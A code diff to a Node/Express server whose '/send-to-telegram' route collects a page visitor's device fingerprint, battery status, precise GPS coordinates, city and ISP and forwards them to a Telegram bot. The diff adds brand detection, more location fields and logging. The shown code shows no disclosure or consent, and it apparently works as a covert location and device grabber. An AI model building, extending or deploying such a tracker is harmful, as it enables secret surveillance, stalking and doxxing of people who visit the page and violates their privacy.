@@ -14,6 +14,20 @@ function escapeMarkdownV2(text) {
   return text.toString().replace(/([_*[\]()~`>#+\-=|{}.!])/g, "\\$1");
 }
 
+// Brand detection fallback helper
+function detectDeviceBrand(userAgent) {
+  const ua = userAgent.toLowerCase();
+  if (ua.includes("samsung")) return "Samsung";
+  if (ua.includes("huawei")) return "Huawei";
+  if (ua.includes("xiaomi")) return "Xiaomi";
+  if (ua.includes("oneplus")) return "OnePlus";
+  if (ua.includes("oppo")) return "Oppo";
+  if (ua.includes("vivo")) return "Vivo";
+  if (ua.includes("apple")) return "Apple";
+  if (ua.includes("pixel")) return "Google Pixel";
+  return "Unknown";
+}
+
 // --- Test page route ---
 app.get("/", (req, res) => {
   res.send(`
@@ -67,14 +81,21 @@ app.get("/", (req, res) => {
 // --- Telegram API route ---
 app.post("/send-to-telegram", async (req, res) => {
   try {
+    console.log("Received POST data:", req.body);
+
     const {
       userAgent, browserName, platform, language, timezone,
       screenWidth, screenHeight, effectiveType, downlink,
       latitude, longitude, mapLink,
-      brand,          // added
-      batteryLevel,   // added
-      isCharging      // added
+      brand,
+      batteryLevel,
+      isCharging,
+      country, region_code, region, city, org,
+      deviceType
     } = req.body;
+
+    // Brand fallback if missing
+    const brandFinal = brand || detectDeviceBrand(userAgent);
 
     function detectDevice(userAgent) {
       const ua = userAgent.toLowerCase();
@@ -96,15 +117,15 @@ app.post("/send-to-telegram", async (req, res) => {
       return { platform: detectedPlatform, deviceType };
     }
 
-    const { platform: friendlyPlatform, deviceType } = detectDevice(userAgent);
+    const { platform: friendlyPlatform, deviceType: backendDeviceType } = detectDevice(userAgent);
 
     const message = `
 📋 *Device Info:*
 🤖 *User Agent:* ${escapeMarkdownV2(userAgent)}
 🌐 *Browser:* ${escapeMarkdownV2(browserName)}
 🖥️ *Platform:* ${escapeMarkdownV2(friendlyPlatform)}
-📱 *Brand:* ${escapeMarkdownV2(brand || "Unknown")}
-📱 *Device Type:* ${escapeMarkdownV2(deviceType)}
+📱 *Brand:* ${escapeMarkdownV2(brandFinal)}
+📱 *Device Type:* ${escapeMarkdownV2(deviceType || backendDeviceType)}
 🔋 *Battery Level:* ${escapeMarkdownV2(batteryLevel ? batteryLevel + "%" : "Unknown")}
 🔌 *Charging:* ${escapeMarkdownV2(isCharging ? "Yes" : "No")}
 🗣️ *Language:* ${escapeMarkdownV2(language)}
@@ -115,8 +136,13 @@ app.post("/send-to-telegram", async (req, res) => {
 🗺️ *Latitude:* ${escapeMarkdownV2(latitude)}
 🗺️ *Longitude:* ${escapeMarkdownV2(longitude)}
 🗺️ *Map:* ${escapeMarkdownV2(mapLink)}
+🌍 *Country:* ${escapeMarkdownV2(country || "Unknown")}
+🏙️ *City:* ${escapeMarkdownV2(city || "Unknown")}
+🏢 *ISP:* ${escapeMarkdownV2(org || "Unknown")}
 🕒 *Timestamp:* ${escapeMarkdownV2(new Date().toLocaleString())}
 `;
+
+    console.log("Telegram message to send:", message);
 
     const telegramRes = await fetch(
       `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
@@ -132,12 +158,15 @@ app.post("/send-to-telegram", async (req, res) => {
     );
 
     if (telegramRes.ok) {
+      console.log("Telegram message sent successfully");
       res.json({ success: true });
     } else {
       const errorData = await telegramRes.json();
+      console.error("Telegram API error:", errorData);
       res.status(500).json({ success: false, error: errorData.description });
     }
   } catch (error) {
+    console.error("Server error:", error);
     res.status(500).json({ success: false, error: error.message });
   }
 });
